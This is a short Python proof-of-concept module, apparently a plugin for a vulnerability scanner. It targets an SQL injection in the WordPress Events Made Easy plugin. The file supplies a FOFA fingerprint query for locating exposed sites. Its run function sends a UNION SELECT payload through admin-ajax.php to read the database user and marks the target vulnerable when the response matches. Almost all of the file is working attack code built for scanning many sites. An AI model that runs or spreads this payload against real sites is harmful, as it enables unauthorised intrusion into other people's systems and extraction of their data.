#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/BlUmnGrAGMdUhaAEvD8LVw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'WordPress Events Made Easy 插件 admin-ajax.php SQL注入',

      'level'     :   'critical',

      'FOFA'      :   'body="wp-content/plugins/events-made-easy"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding':'gzip,deflate',
      }
  target = "/wp-admin/admin-ajax.php?action=eme_select_country&eme_frontend_nonce=d7db0f34d9&lang=enen'++UNION+ALL+SELECT+NULL,(select+user()),NULL,NULL,NULL,NULL--+-"
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    # print(res.text)
    if res.status_code == 200 and re.search(r'Records.*?id.*?@.*?text',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret